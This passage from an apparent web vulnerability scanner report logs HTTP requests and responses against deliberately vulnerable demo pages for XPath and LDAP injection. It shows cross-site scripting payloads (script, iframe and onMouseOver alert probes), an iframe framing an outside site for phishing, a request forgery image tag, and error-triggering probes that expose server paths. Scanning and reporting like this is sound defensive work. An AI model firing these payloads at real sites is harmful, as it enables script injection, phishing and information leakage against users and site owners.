          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 76
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27%22%3E%3Ciframe+src%3Djavascript%3Aalert%2825448%29%3E
HTTP/1.1 200 OK
Content-Length: 570
Date: Mon, 14 Jul 2014 14:47:28 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or '"&gt;&lt;iframe src=javascript:alert(25448)&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12514">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=%27%22%3E%3Cscript%3Ealert(25452)%3C%2Fscript%3E</Difference>
          <Reasoning>The test successfully embedded a script in the response, and it will be executed once the page is loaded in the user's browser. This means the application is vulnerable to  Cross-Site Scripting.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1047" Length="12" String="alert(25452)" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 67
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27%22%3E%3Cscript%3Ealert(25452)%3C%2Fscript%3E
HTTP/1.1 200 OK
Content-Length: 563
Date: Mon, 14 Jul 2014 14:47:28 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or '"&gt;&lt;script&gt;alert(25452)&lt;/script&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12522">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=%27%22&gt;&lt;A%20HREF=Link%20onMouseOver=alert(25468)&gt;HoverMe&lt;/A&gt;</Difference>
          <Reasoning>The test successfully embedded a script in the response, which will be executed once the user activates the OnMouseOver function (i.e., hovers with the mouse cursor over the vulnerable control). This means that the application is vulnerable to Cross-Site Scripting attacks.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1051" Length="38" String="&lt;A HREF=Link onMouseOver=alert(25468)&gt;" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 79
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27%22&gt;&lt;A%20HREF=Link%20onMouseOver=alert(25468)&gt;HoverMe&lt;/A&gt;
HTTP/1.1 200 OK
Content-Length: 583
Date: Mon, 14 Jul 2014 14:47:28 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or '"&gt;&lt;A HREF=Link onMouseOver=alert(25468)&gt;HoverMe&lt;/A&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attUndefinedState" Noise="False">
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
        <Entity Name="password" Type="Parameter" />
        <Variant ID="12540">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=%27</Difference>
          <Reasoning>The application has responded with an error message, indicating an undefined state that may expose sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="650" Length="305" String="Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19&#xA;&#xA;Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 22
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27
HTTP/1.1 200 OK
Content-Length: 532
Date: Mon, 14 Jul 2014 14:47:28 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or '
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12541">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=\'</Difference>
          <Reasoning>The application has responded with an error message, indicating an undefined state that may expose sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="649" Length="305" String="Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19&#xA;&#xA;Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 21
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=\'
HTTP/1.1 200 OK
Content-Length: 533
Date: Mon, 14 Jul 2014 14:47:28 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or \'
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12547">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=%00</Difference>
          <Reasoning>The application has responded with an error message, indicating an undefined state that may expose sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="650" Length="306" String="Warning: DOMXPath::query(): Unfinished literal in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19&#xA;&#xA;Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 22
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%00
HTTP/1.1 200 OK
Content-Length: 533
Date: Mon, 14 Jul 2014 14:47:28 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Unfinished literal in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or  
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="phishingInFrames" Noise="False">
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
        <Entity Name="password" Type="Parameter" />
        <Variant ID="12554">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=%27%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fdemo.testfire.net%3E</Difference>
          <Reasoning>The test response contained a link to the URL "http://demo.testfire.net, which proves that the Phishing attempt was successful.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1061" Length="24" String="http://demo.testfire.net" />
            <Validation Location="1068" Length="17" String="demo.testfire.net" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 77
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%27%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fdemo.testfire.net%3E
HTTP/1.1 200 OK
Content-Length: 571
Date: Mon, 14 Jul 2014 14:47:28 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid predicate in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or '"&gt;&lt;iframe src=http://demo.testfire.net&gt;
	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attLinkInjection" Noise="False">
        <Url>http://tftarget/demo/XPathInjection2.php</Url>
        <Entity Name="password" Type="Parameter" />
        <Variant ID="12564">
          <Comments />
          <Difference>parameter: cookie password= -&gt; password=%22%27%3E%3CIMG+SRC%3D%22%2FWF_XSRF.html%22%3E</Difference>
          <Reasoning>The test response contained a link to the file "WF_XSRF.html, which proves that the Cross-Site Request Forgery attempt was successful.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="1048" Length="13" String="/WF_XSRF.html" />
            <Validation Location="1049" Length="12" String="WF_XSRF.html" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 212
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	The User was not found.
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/XPathInjection2.php HTTP/1.0
Content-Length: 65
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/XPathInjection.php

username=&amp;password=%22%27%3E%3CIMG+SRC%3D%22%2FWF_XSRF.html%22%3E
HTTP/1.1 200 OK
Content-Length: 560
Date: Mon, 14 Jul 2014 14:47:28 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- XPath Injection 2  --&gt;
&lt;!-- This page realizes an XPath Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;XPath Injection&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19

Warning: DOMXPath::query(): Invalid expression in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\XPathInjection2.php on line 19
Incompatible XPath key, either  or "'&gt;&lt;IMG SRC="/WF_XSRF.html"&gt;
	&lt;/body&gt;
&lt;/html&gt;


GET /WF_XSRF.html HTTP/1.0
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Referer: http://tftarget/demo/XPathInjection2.php


HTTP/1.1 404 Not Found
Content-Length: 210
Date: Mon, 14 Jul 2014 14:47:29 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
Connection: close
Content-Type: text/html; charset=iso-8859-1

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /WF_XSRF.html was not found on this server.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
      </Issue>
      <Issue IssueTypeID="attUndefinedState" Noise="False">
        <Url>http://tftarget/demo/LDAPInjection2.php</Url>
        <Entity Name="username" Type="Parameter" />
        <Variant ID="12641">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=\'</Difference>
          <Reasoning>The application has responded with an error message, indicating an undefined state that may expose sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="645" Length="154" String="Warning: ldap_search(): Search: Bad search filter in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\LDAPInjection2.php on line 25" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/LDAPInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/LDAPInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 204
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- LDAP Injection 2  --&gt;
&lt;!-- This page realizes an LDAP Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;LDAP Injection2&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	Login failed.&lt;br&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/LDAPInjection2.php HTTP/1.0
Content-Length: 21
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/LDAPInjection.php

username=\'&amp;password=
HTTP/1.1 200 OK
Content-Length: 343
Date: Mon, 14 Jul 2014 14:47:29 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- LDAP Injection 2  --&gt;
&lt;!-- This page realizes an LDAP Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;LDAP Injection2&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: ldap_search(): Search: Bad search filter in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\LDAPInjection2.php on line 25

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12644">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=\"</Difference>
          <Reasoning>The application has responded with an error message, indicating an undefined state that may expose sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="645" Length="154" String="Warning: ldap_search(): Search: Bad search filter in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\LDAPInjection2.php on line 25" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/LDAPInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/LDAPInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 204
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- LDAP Injection 2  --&gt;
&lt;!-- This page realizes an LDAP Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;LDAP Injection2&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	Login failed.&lt;br&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/LDAPInjection2.php HTTP/1.0
Content-Length: 21
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/LDAPInjection.php

username=\"&amp;password=
HTTP/1.1 200 OK
Content-Length: 343
Date: Mon, 14 Jul 2014 14:47:29 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- LDAP Injection 2  --&gt;
&lt;!-- This page realizes an LDAP Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;LDAP Injection2&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: ldap_search(): Search: Bad search filter in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\LDAPInjection2.php on line 25

	&lt;/body&gt;
&lt;/html&gt;
</TestHttpTraffic>
        </Variant>
        <Variant ID="12645">
          <Comments />
          <Difference>parameter: cookie username= -&gt; username=)</Difference>
          <Reasoning>The application has responded with an error message, indicating an undefined state that may expose sensitive information.</Reasoning>
          <ValidationDataLocationAtTestResponse>
            <Validation Location="644" Length="154" String="Warning: ldap_search(): Search: Bad search filter in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\LDAPInjection2.php on line 25" />
          </ValidationDataLocationAtTestResponse>
          <OriginalHttpTraffic>POST /demo/LDAPInjection2.php HTTP/1.0
Content-Length: 19
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/LDAPInjection.php

username=&amp;password=
HTTP/1.1 200 OK
Content-Length: 204
Date: Mon, 14 Jul 2014 14:44:47 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- LDAP Injection 2  --&gt;
&lt;!-- This page realizes an LDAP Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;LDAP Injection2&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	Login failed.&lt;br&gt;
	&lt;/body&gt;
&lt;/html&gt;
</OriginalHttpTraffic>
          <TestHttpTraffic>POST /demo/LDAPInjection2.php HTTP/1.0
Content-Length: 20
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: tftarget
Content-Type: application/x-www-form-urlencoded
Referer: http://tftarget/demo/LDAPInjection.php

username=)&amp;password=
HTTP/1.1 200 OK
Content-Length: 343
Date: Mon, 14 Jul 2014 14:47:29 GMT
Server: Apache/2.2.19 (Win32) PHP/5.3.6
X-Powered-By: PHP/5.3.6
Connection: close
Content-Type: text/html

&lt;!-- LDAP Injection 2  --&gt;
&lt;!-- This page realizes an LDAP Injection vulnerability. --&gt;

&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;LDAP Injection2&lt;/title&gt;
	&lt;/head&gt;
	&lt;body&gt;
	
	
Warning: ldap_search(): Search: Bad search filter in C:\Program Files (x86)\Apache Software Foundation\Apache2.2\htdocs\demo\LDAPInjection2.php on line 25

	&lt;/body&gt;
&lt;/html&gt;
